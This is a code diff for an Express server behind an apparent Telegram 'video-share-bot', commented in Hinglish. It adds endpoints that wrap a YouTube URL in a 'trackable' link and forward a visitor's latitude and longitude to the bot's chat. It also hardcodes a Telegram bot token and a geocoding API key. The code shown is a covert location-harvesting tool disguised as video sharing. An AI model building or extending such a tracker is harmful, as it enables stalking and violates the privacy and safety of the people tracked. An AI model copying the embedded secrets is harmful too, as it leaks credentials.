@@ -6,11 +6,14 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// Aapka GitHub repository path
 const GITHUB_PAGES_URL = 'https://saiq123341-create.github.io/-video-share-bot';
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+// Testing aur hosting dono ke liye token config
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8533487611:AAHhVSNRfI3h88rYOgzOVHuc9rRfNpiLZIk';
 const GEOCODE_API_KEY = process.env.GEOCODE_API_KEY || '6a5bb6dec8d47064344344ezpa215ba';
 
+// 1. Bot se URL lekar trackable URL banana
 app.post('/bot/generate-link', (req, res) => {
     const { chat_id, youtube_url } = req.body;
     
@@ -25,6 +28,7 @@ app.post('/bot/generate-link', (req, res) => {
     res.json({ tracking_link: trackingLink });
 });
 
+// 2. Location data lekar bot par message trigger karna
 app.post('/api/report-location', async (req, res) => {
     const { chat_id, lat, lon } = req.body;
 
